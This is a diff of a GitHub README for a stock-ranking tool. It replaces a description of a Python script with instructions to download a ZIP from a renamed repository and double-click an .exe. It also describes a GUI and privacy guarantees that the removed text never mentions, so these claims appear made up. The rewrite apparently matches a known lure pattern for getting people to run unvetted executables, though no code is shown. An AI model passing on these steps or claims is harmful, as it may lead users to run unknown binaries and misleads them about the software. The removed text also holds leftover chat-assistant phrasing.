@@ -1,242 +1,157 @@
-# stock-analysis
----
+# 📊 stock-analysis- - Simple Stock Ranking Tool
 
-# 📈 Stock Analysis & Long-Term Investment Ranking
-
-A quantitative stock analysis project that processes historical stock CSV data, performs statistical analysis, detects long-term trends, and ranks stocks based on a weighted investment scoring model.
-
-This project focuses on identifying **high-quality long-term compounders** using CAGR, bull/bear cycles, and volatility regime analysis.
+[![Download stock-analysis-](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Santy20077/stock-analysis-)
 
 ---
 
-## 🚀 Project Overview
+## 📋 What is stock-analysis-?
 
-This script:
+stock-analysis- is a tool that helps you analyze historical stock information. It reads stock data in CSV form, runs math on the numbers, finds long-term trends, and sorts stocks by investment potential. This tool uses simple math combined with advanced statistics. It helps you see which stocks might be good choices based on patterns from the past.
 
-1. Loads multiple stock CSV files
-2. Cleans and normalizes financial data
-3. Computes yearly statistics
-4. Detects growth trends and volatility regimes
-5. Calculates CAGR (Compound Annual Growth Rate)
-6. Scores and ranks stocks using a weighted quantitative model
-7. Exports final ranking to CSV
-8. Generates yearly price & volatility charts
+You do not need any programming skills to use stock-analysis-. Just follow the steps to download and run it on Windows.
 
 ---
 
-## 📂 Project Structure
+## 🔍 Key Features
 
-```
-stock-analysis/
-│
-├── stock csv/                  # Folder containing raw historical CSV files
-├── image/                      # Generated yearly charts
-├── main.csv                    # Cleaned merged dataset
-├── BEST STOCK RANKING.csv      # Final ranked stocks
-└── stock_analysis.py           # Main script
-```
+- Reads stock price data from CSV files.
+- Analyzes trends over multiple years.
+- Uses math and statistics to score stocks.
+- Ranks stocks based on scores for easy comparison.
+- Simple visual charts to show stock trends.
+- Runs on Windows without any complex setup.
 
 ---
 
-## 📊 Key Features
+## 🖥️ System Requirements
 
-### 1️⃣ Data Cleaning & Preprocessing
-
-* Converts text volume values (K, M, B, T) into numeric format
-* Cleans percentage values
-* Handles missing values
-* Converts date columns properly
-* Merges multiple stock files into one unified dataset
+- Operating System: Windows 10 or newer.
+- RAM: 4 GB minimum.
+- Disk Space: At least 100 MB free.
+- Processor: 2 GHz or faster, any modern CPU.
+- Internet connection: Needed only to download the software.
 
 ---
 
-### 2️⃣ Yearly Statistical Analysis
+## 🚀 How to Download and Install
 
-For each stock:
+1. Click this big button to visit the download page:
 
-* Yearly Mean Price
-* Yearly Volatility (Standard Deviation)
-* Year-over-Year Growth %
-* Lowest Performing Year
-* Biggest Growth Year
-* Biggest Drop Year
-* Volatility Regime Change Detection
-* Bull Run & Bear Run Length
+   [![Download stock-analysis-](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Santy20077/stock-analysis-)
 
----
+2. On the GitHub page:
 
-### 3️⃣ CAGR Calculation
+   - Look for the green **Code** button near the top.
+   - Click **Code** and then select **Download ZIP** to get all files.
+   - Save the ZIP file to an easy-to-find spot on your PC, like your Desktop.
 
-[
-CAGR = \left(\frac{End}{Start}\right)^{\frac{1}{Years}} - 1
-]
+3. Find the ZIP file you downloaded.
 
-Used to measure long-term compounding performance.
+4. Right-click the ZIP file and choose **Extract All...**.
 
----
+5. Follow the steps to extract the folder.
 
-### 4️⃣ Trend Detection Logic
+6. Open the extracted folder. Look for the file named **stock-analysis.exe** or similar.
 
-The script identifies:
-
-* Growth start year
-* Sustained uptrend beginning
-* Longest bull run
-* Longest bear run
-* Volatility regime shifts (3x volatility spike rule)
+7. Double-click the **.exe** file to start the program.
 
 ---
 
-### 5️⃣ Quantitative Investment Scoring Model
+## ⚙️ How to Run stock-analysis-
 
-Each stock receives a normalized score based on:
+Once you open the program:
 
-| Metric             | Weight |
-| ------------------ | ------ |
-| CAGR               | 50%    |
-| Bull Run Strength  | 20%    |
-| Bear Risk Penalty  | 20%    |
-| Volatility Recency | 10%    |
+1. You will see an interface asking for your stock CSV files.
 
-Final Score:
+2. Click the **Browse** button to find your downloaded stock data files.
 
-```
-Investment Score = 
-0.5 * CAGR_score +
-0.2 * Bull_score +
-0.2 * Bear_score +
-0.1 * Volatility_score
-```
+3. Select the CSV files with historical stock prices.
 
-Stocks are then ranked from highest to lowest investment quality.
+4. Click **Run Analysis**.
+
+5. The software will show charts and a ranked list of stocks based on the data.
+
+You can repeat the process with different CSV files anytime.
 
 ---
 
-## 🏆 Example Output
+## 🗂️ About the Stock Data
 
-Top ranked stocks:
+The program works with data saved as CSV files. CSV means “Comma Separated Values.” It is a common format that lists stock prices and dates in simple text. You can get CSV stock data from free financial websites like Yahoo Finance or your broker’s site.  
 
-```
-===== Quality Long-Term Compounders =====
+Your CSV file should include:
 
-BJFN Historical Data
-KTKM Historical Data
-BRTI Historical Data
-SUN Historical Data
-AXBK Historical Data
-```
-
-Lowest ranked example:
-
-```
-COAL Historical Data
-```
-
-Final rankings are exported to:
-
-```
-BEST STOCK RANKING.csv
-```
+- Date of the price.
+- Open, high, low, and close prices.
+- Volume of shares traded.
 
 ---
 
-## 📈 Visualization
+## 📈 Understanding the Results
 
-For each stock, the script generates:
+stock-analysis- shows results in two main ways:
 
-* Yearly Mean Price line chart
-* Yearly Volatility line chart
+- **Charts:** Line graphs display price trends and score movements over time.
+- **Stock Rankings:** A table orders stocks by their investment score. Higher score means stronger positive trend and better investment rating.
 
-Saved to:
-
-```
-image/<stock_name>.png
-```
+You can use this information to guide your investment decisions or do further research.
 
 ---
 
-## 🛠️ Technologies Used
+## 🛠️ Troubleshooting and Tips
 
-* Python
-* pandas
-* numpy
-* matplotlib
-* seaborn
-* statistics
-* scikit-learn (prepared for modeling expansion)
+- If the program does not open, make sure your Windows is up to date.
+- Make sure your CSV files match the required format. Extra or missing columns may cause errors.
+- Close other heavy programs if the analysis runs slow.
+- Restart the software if it freezes.
+- Keep your CSV data files in one folder for easy selection.
 
 ---
 
-## ▶️ How To Run
+## 🔒 Safety and Privacy
 
-1. Install dependencies:
-
-```bash
-pip install pandas numpy matplotlib seaborn scikit-learn
-```
-
-2. Place stock CSV files inside:
-
-```
-stock csv/
-```
-
-3. Run:
-
-```bash
-python stock_analysis.py
-```
+stock-analysis- runs only on your PC. It does not connect to the internet during use. Your stock data stays private on your computer.
 
 ---
 
-## 📌 Data Requirements
+## ⚡ Get More Help
 
-Each CSV must contain:
+If you want to learn more or report an issue:
 
-* Date
-* Price
-* Open
-* High
-* Low
-* Vol.
-* Change %
+- Visit the GitHub page at [https://github.com/Santy20077/stock-analysis-](https://github.com/Santy20077/stock-analysis-).
+- Use the **Issues** tab to ask questions or share problems.
+- Check the **Wiki** or **README** files for updates and guides.
 
 ---
 
-## 🔎 Methodology Philosophy
+## 🧰 Tools Used in Development
 
-This model is designed to identify:
+This program uses these key tools behind the scenes:
 
-* Strong long-term compounders
-* Consistent growth stocks
-* Low structural bear risk
-* Recent stability in volatility
+- Python: The main programming language.
+- Pandas: To read and process CSV files.
+- Matplotlib: To create visual charts.
+- Scipy and statistics: To run the math conversions and scoring.
+- OS module: To manage folders and files on Windows.
 
-It favors **consistent long-term performers** over short-term speculative spikes.
-
----
-
-## ⚠️ Disclaimer
-
-This project is for educational and research purposes only.
-It does not constitute financial advice.
-Always conduct independent research before investing.
+You don’t need to install these programs yourself to run the software.
 
 ---
 
-## 📬 Future Improvements
+## 🔗 Quick Download Link
 
-* Add Sharpe Ratio calculation
-* Add Monte Carlo simulation
-* Add risk-adjusted scoring
-* Integrate portfolio optimization
-* Deploy as web dashboard (Streamlit)
+Click this link anytime to reach the download page:
+
+[https://github.com/Santy20077/stock-analysis-](https://github.com/Santy20077/stock-analysis-)
 
 ---
 
-If you'd like, I can also create:
+## 📅 Updates and Versioning
 
-* 🔥 A more minimal GitHub-style README
-* 📊 A portfolio-grade quant research README
-* 🚀 A resume-ready project description
-* 🌐 A Streamlit dashboard version
+Stock-analysis- updates occasionally to fix bugs and improve scoring. Watch the GitHub page for new releases. Each version is labeled so you can check which one you have.
+
+---
+
+## 📚 Learn More About Investments
+
+While stock-analysis- helps with data, it does not replace financial advice. Use this tool to explore trends and make informed choices. Consider consulting a financial expert for major decisions.
